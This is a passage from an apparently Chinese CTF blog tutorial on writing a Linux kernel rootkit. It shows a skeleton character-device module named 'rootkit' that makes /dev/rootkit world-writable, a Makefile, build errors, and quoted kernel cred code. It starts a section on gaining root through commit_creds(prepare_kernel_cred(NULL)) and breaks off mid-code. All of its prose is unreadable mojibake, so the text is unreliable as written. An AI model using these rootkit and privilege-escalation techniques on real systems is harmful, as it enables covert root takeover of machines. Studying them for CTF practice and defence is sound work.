class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_NAME <span class="meta-string">&quot;rootkit&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLASS_NAME <span class="meta-string">&quot;rootkit_class&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_PATH <span class="meta-string">&quot;/dev/rootkit&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_open</span><span class="params">(struct inode *__inode, struct file *__file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">rootkit_read</span><span class="params">(struct file *__file, <span class="keyword">char</span> __user *user_buf, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *__loff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">rootkit_write</span><span class="params">(struct file *__file, <span class="keyword">const</span> <span class="keyword">char</span> __user *user_buf, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *__loff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_release</span><span class="params">(struct inode *__inode, struct file *__file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">rootkit_ioctl</span><span class="params">(struct file *__file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> major_num;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> *<span class="title">module_class</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">module_device</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *__<span class="title">file</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *__<span class="title">inode</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">rootkit_fo</span> =</span></span><br><span class="line">    &#123;</span><br><span class="line">        .owner = THIS_MODULE,</span><br><span class="line">        .unlocked_ioctl = rootkit_ioctl,</span><br><span class="line">        .open = rootkit_open,</span><br><span class="line">        .read = rootkit_read,</span><br><span class="line">        .write = rootkit_write,</span><br><span class="line">        .release = rootkit_release,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    major_num = register_chrdev(<span class="number">0</span>, DEVICE_NAME, &amp;rootkit_fo);</span><br><span class="line">    <span class="keyword">if</span> (major_num &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> major_num;</span><br><span class="line"></span><br><span class="line">    module_class = class_create(THIS_MODULE, CLASS_NAME);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(module_class))</span><br><span class="line">    &#123;</span><br><span class="line">        unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(module_class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    module_device = device_create(module_class, <span class="literal">NULL</span>, MKDEV(major_num, <span class="number">0</span>), <span class="literal">NULL</span>, DEVICE_NAME);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(module_device))</span><br><span class="line">    &#123;</span><br><span class="line">        class_destroy(module_class);</span><br><span class="line">        unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(module_device);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __file = filp_open(DEVICE_PATH, O_RDONLY, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(__file))</span><br><span class="line">    &#123;</span><br><span class="line">        device_destroy(module_class, MKDEV(major_num, <span class="number">0</span>));</span><br><span class="line">        class_destroy(module_class);</span><br><span class="line">        unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(__file);</span><br><span class="line">    &#125;</span><br><span class="line">    __inode = file_inode(__file);</span><br><span class="line">    __inode-&gt;i_mode |= <span class="number">0666</span>;</span><br><span class="line">    filp_close(__file, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    printk(<span class="string">&quot;test:module loaded\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rootkit_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    device_destroy(module_class, MKDEV(major_num, <span class="number">0</span>));</span><br><span class="line">    class_destroy(module_class);</span><br><span class="line">    unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">    printk(<span class="string">&quot;test:module removed\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(rootkit_init);</span><br><span class="line">module_exit(rootkit_exit);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;196082&quot;</span>);</span><br><span class="line">MODULE_INFO(intree, <span class="string">&quot;Y&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ç»™åˆ°ä¸€ä¸ªctfé¢˜ç›®ä¸­é©±åŠ¨çš„å¤§ä½“æ¨¡æ¿ï¼Œåç»­æˆ‘ä»¬ä¹Ÿå°†åœ¨è¿™ä¸Šé¢è¿›è¡Œå¢åŠ ä¿®æ”¹ç­‰ï¼Œè¿™é‡Œç®€å•è¯´ä¸€ä¸‹åœ¨<code>rootkit_init</code>å‡½æ•°ä¸­ï¼Œé¦–å…ˆæ˜¯æ³¨å†Œäº†å¯¹åº”çš„è®¾å¤‡åå­—ï¼Œéšååˆ›å»ºå…¶classï¼Œæœ€ååˆ›å»ºè®¾å¤‡ã€‚åœ¨åˆ›å»ºå®Œè®¾å¤‡ä¹‹åå°±å¯ä»¥åœ¨ç³»ç»Ÿçš„<code>/dev</code>ç›®å½•ä¸­çœ‹åˆ°ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20240204162746884.png"                      alt="image-20240204162746884"                ></p><p>æœ€åè¿™é‡Œç»™åˆ°ç¼–è¯‘é©±åŠ¨æ‰€éœ€è¦çš„Makefile</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">obj-m += rootkit.o</span><br><span class="line">CURRENT_PATH := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line">LINUX_KERNEL_PATH := ./linux-5.11</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">make -C <span class="variable">$(LINUX_KERNEL_PATH)</span> M=<span class="variable">$(CURRENT_PATH)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">make -C <span class="variable">$(LINUX_KERNEL_PATH)</span> M=<span class="variable">$(CURRENT_PATH)</span> clean</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±ä¸è¿‡å¤šè§£é‡Šäº†ç›¸ä¿¡å¤§å®¶éƒ½èƒ½çœ‹æ‡‚ã€‚ä¸è¿‡å¥½åƒåœ¨<code>linux 5.10</code>ä¹‹åç‰ˆæœ¬ä¸­ä¼šå‡ºç°ä¸€äº›é—®é¢˜ï¼Œè¿™é‡Œåœ¨æˆ‘é‡åˆ°çš„é—®é¢˜åšä¸€ä¸ªç®€å•çš„æ±‡æ€»ï¼ˆä¸ä¸€å®šå…¨å¯¹ï¼Œå› ä¸ºæˆ‘æ²¡æœ‰å…¨éƒ¨å®éªŒè¿‡ï¼‰ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">make -C ./linux-5.11 M=/media/psf/pwn/rootkit modules</span><br><span class="line">make[1]: Entering directory <span class="string">&#x27;/media/psf/pwn/rootkit/linux-5.11&#x27;</span></span><br><span class="line">WARNING: Symbol version dump <span class="string">&quot;Module.symvers&quot;</span> is missing.</span><br><span class="line">         Modules may not have dependencies or modversions.</span><br><span class="line">make[3]: *** No rule to make target <span class="string">&#x27;scripts/module.lds&#x27;</span>, needed by <span class="string">&#x27;/media/psf/pwn/rootkit/rootkit.ko&#x27;</span>.  Stop.</span><br><span class="line">make[2]: *** [scripts/Makefile.modpost:117: __modpost] Error 2</span><br><span class="line">make[1]: *** [Makefile:1704: modules] Error 2</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/media/psf/pwn/rootkit/linux-5.11&#x27;</span></span><br><span class="line">make: *** [Makefile:5: all] Error 2</span><br></pre></td></tr></table></figure><p>åœ¨ç¼–è¯‘æ—¶é‡åˆ°äº†è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨æˆ‘æ‰€æŒ‡å‘çš„Linuxå†…æ ¸è·¯å¾„ä¸‹ç¼ºå°‘äº†<code>script/module.lds</code>æ–‡ä»¶ï¼Œå¯¼è‡´ç¼–è¯‘å‡ºé”™ã€‚ç»è¿‡ä¸æ–­çš„æŸ¥æ‰¾ç½‘ä¸Šè¯´æ˜¯å› ä¸ºæˆ‘åœ¨ç¼–è¯‘å†…æ ¸æ—¶å¹¶æ²¡æœ‰ç¼–è¯‘é©±åŠ¨æ¨¡å—å¯¼è‡´çš„ï¼Œå› ä¸ºæˆ‘ç¼–è¯‘å†…æ ¸æ—¶ç¡®å®æ˜¯ä½¿ç”¨çš„<code>make vmlinux / make bzImage</code>ã€‚æ‰€ä»¥æˆ‘åšçš„å°±æ˜¯å»ç¼–è¯‘ä¸€ä¸‹é©±åŠ¨ï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä¸‹è½½çš„Linuxæºç æ˜¯åœ¨å…±äº«ç›®å½•è§£åŒ…çš„ç¼˜æ•…ä¼šå­˜åœ¨è§£åŒ…ä¸å®Œå…¨çš„æƒ…å†µå¯¼è‡´åœ¨ç¼–è¯‘é©±åŠ¨æ—¶å‡ºç°åŒ…å«é”™è¯¯ï¼Œå¹¶ä¸”æˆ‘çš„ubuntuè™šæ‹Ÿæœºå·²ç»æœ‰70Gçš„å¤§å°äº†ï¼ˆæ‡’ç‹—ä¸€ç›´æ²¡æœ‰è¿›è¡Œæ¸…ç†è¿‡ï¼‰ï¼Œè¿™ä¹Ÿå¯¼è‡´æˆ‘è®²æºç æ”¾åˆ°ubuntuå®¶ç›®å½•è§£åŒ…ä¹‹åå› ä¸ºå¤§å°ä¸è¶³å¯¼è‡´å¤±è´¥ï¼Œæ‰€ä»¥æ˜¯å¦çœŸçš„å¯ä»¥é€šè¿‡<code>make modules</code>æˆ‘ä¹Ÿä¸çŸ¥é“ã€‚</p><p>æœ€ç»ˆçš„è§£å†³åŠæ³•æ˜¯<code>touch ./linux-5.11/script/module.lds</code>å°±å¥½äº†ï¼ï¼ï¼</p><p>è‡³äºä¸ºä»€ä¹ˆï¼Œæ˜¯å› ä¸º<code>scripts/module.lds</code> æ–‡ä»¶é€šå¸¸ç”¨äºé“¾æ¥å†…æ ¸æ¨¡å—ï¼ˆé©±åŠ¨ç¨‹åºï¼‰çš„ç¬¦å·è¡¨å’Œåœ°å€ã€‚å½“ä½ çš„é©±åŠ¨ç¨‹åºæ²¡æœ‰ç‰¹å®šçš„é“¾æ¥è„šæœ¬æ—¶ï¼Œç¼–è¯‘å™¨ä¼šä½¿ç”¨é»˜è®¤çš„é“¾æ¥è„šæœ¬ï¼Œå…¶ä¸­åŒ…æ‹¬ä¸€äº›é»˜è®¤çš„ç¬¦å·å’Œåœ°å€ã€‚åˆ›å»ºä¸€ä¸ªç©ºçš„ <code>module.lds</code> æ–‡ä»¶å®é™…ä¸Šæ˜¯ä¸€ç§â€œå ä½ç¬¦â€æ–¹æ³•ã€‚å®ƒå‘Šè¯‰ç¼–è¯‘å™¨ï¼šâ€œå˜¿ï¼Œæˆ‘çŸ¥é“ä½ éœ€è¦ä¸€ä¸ªé“¾æ¥è„šæœ¬ï¼Œä½†æˆ‘ä¸éœ€è¦è‡ªå®šä¹‰çš„ç¬¦å·æˆ–åœ°å€ã€‚è¯·ä½¿ç”¨é»˜è®¤çš„é“¾æ¥è„šæœ¬â€ã€‚å› æ­¤ï¼Œå³ä½¿æ˜¯ç©ºçš„ <code>module.lds</code> æ–‡ä»¶ä¹Ÿè¶³å¤Ÿè®©ç¼–è¯‘å™¨æˆåŠŸé“¾æ¥ä½ çš„é©±åŠ¨ç¨‹åºã€‚</p><h2 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="keyword">atomic_long_t</span>usage;</span><br><span class="line"><span class="keyword">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="keyword">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"><span class="keyword">unsigned</span>securebits;<span class="comment">/* SUID-less security management */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_permitted;<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_effective;<span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_bset;<span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_ambient;<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>jit_keyring;<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment"> * keys to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">void</span>*security;<span class="comment">/* LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">/* real user ID subscription */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ucounts</span> *<span class="title">ucounts</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span><span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="comment">/* RCU deletion */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> non_rcu;<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>ç›¸ä¿¡å‰é¢è¿™ä¸ª<code>cred</code>ç»“æ„ä½“å¤§å®¶éƒ½ä¸é™Œç”Ÿï¼Œåœ¨Linuxä¸­æ¯ä¸€ä¸ªè¿›ç¨‹åœ¨kernelä¸­éƒ½æœ‰ä¸ä¹‹å¯¹åº”çš„credç»“æ„ä½“ç”¨ä»¥æ ‡è¯†å…¶æƒé™ã€‚</p><p>è¿™é‡Œä¸»è¦å…³æ³¨å…¶ä¸­çš„uidï¼š</p><p>é¦–å…ˆæ˜¯ç»“æ„ä½“å¼€å¤´çš„uidå³çœŸå®ç”¨æˆ·æ³¨é‡Šä¸º<code>real UID of the task</code>ï¼Œç”¨äºè¡¨ç¤ºä¸€ä¸ªè¿›ç¨‹å¯åŠ¨æ—¶çš„ç”¨æˆ·IDã€‚</p><p>éšåæ˜¯suidå³ä¿å­˜ç”¨æˆ·idæ³¨é‡Šä¸º<code>saved UID of the task</code>ï¼Œç”¨äºè¡¨ç¤ºä¸€ä¸ªè¿›ç¨‹æœ€åˆçš„æœ‰æ•ˆIDã€‚</p><p>ç„¶åæ˜¯euidå³æœ‰æ•ˆç”¨æˆ·idæ³¨é‡Šä¸º<code>effective UID of the task</code>ï¼Œç”¨äºæ ‡è¯†ä¸€ä¸ªè¿›ç¨‹æ­£åœ¨è¿è¡Œæ—¶æ‰€å±çš„ç”¨æˆ·IDï¼Œä¸€ä¸ªè¿›ç¨‹åœ¨è¿è¡Œé€”ä¸­æ˜¯å¯ä»¥æ”¹å˜è‡ªå·±æ‰€å±ç”¨æˆ·çš„ï¼Œå› è€Œæƒé™æœºåˆ¶ä¹Ÿæ˜¯é€šè¿‡æœ‰æ•ˆç”¨æˆ·IDè¿›è¡Œè®¤è¯çš„ã€‚</p><p>æœ€åæ˜¯fsuidå³æ–‡ä»¶ç³»ç»Ÿç”¨æˆ·idæ³¨é‡Šä¸º<code>UID for VFS ops</code>ï¼Œç”¨äºæ ‡è¯†ä¸€ä¸ªè¿›ç¨‹åˆ›å»ºæ–‡ä»¶æ—¶è¿›è¡Œæ ‡è¯†çš„ç”¨æˆ·IDã€‚</p><h3 id="é€šè¿‡commit-creds-prepare-kernel-cred-NULL-ææƒ"><a href="#é€šè¿‡commit-creds-prepare-kernel-cred-NULL-ææƒ" class="headerlink" title="é€šè¿‡commit_creds(prepare_kernel_cred(NULL))ææƒ"></a>é€šè¿‡commit_creds(prepare_kernel_cred(NULL))ææƒ</h3><p>æœ‰kernel pwnåŸºç¡€çš„æœ‹å‹éƒ½çŸ¥é“å¦‚æœæˆ‘ä»¬ç›´æ¥ä¿®æ”¹å‰é¢çš„æ‰€æœ‰uidä¸º0å³å¯å®ç°ææƒï¼Œæ‰€ä»¥è¿™é‡Œå­˜åœ¨ä¸¤ç§ææƒæ–¹å¼ï¼Œä¸€ç§æ˜¯ä½ç‰ˆæœ¬å†…æ ¸ç‰ˆæœ¬çš„ä½¿ç”¨<code>commit_creds(prepare_kernel_cred(NULL))</code>è¿›è¡Œææƒï¼Œç¬¬äºŒç§å°±æ˜¯é€šè¿‡ç›´æ¥ä¿®æ”¹credç»“æ„ä½“äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct cred *<span class="title">prepare_kernel_cred</span><span class="params">(struct task_struct *daemon)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (daemon)</span><br><span class="line">old = get_task_cred(daemon);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">old = get_cred(&amp;init_cred);</span><br><span class="line"></span><br><span class="line">validate_creds(old);</span><br><span class="line"></span><br><span class="line">*<span class="keyword">new</span> = *old;</span><br><span class="line"><span class="keyword">new</span>-&gt;non_rcu = <span class="number">0</span>;</span><br><span class="line">atomic_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">set_cred_subscribers(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line">get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="keyword">new</span>-&gt;session_keyring = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;process_keyring = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;thread_keyring = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;request_key_auth = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;jit_keyring = KEY_REQKEY_DEFL_THREAD_KEYRING;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">if</span> (security_prepare_creds(<span class="keyword">new</span>, old, GFP_KERNEL_ACCOUNT) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">put_cred(old);</span><br><span class="line">validate_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">put_cred(<span class="keyword">new</span>);</span><br><span class="line">put_cred(old);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(prepare_kernel_cred);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨ä½ç‰ˆæœ¬çš„å‡½æ•°ä¸­å¦‚æœä¼ å…¥çš„æ˜¯NULLï¼Œåˆ™ç›´æ¥ä¼šå»<code>init_cred</code>ä¸ºoldæœ€åå¤åˆ¶ç»™newã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 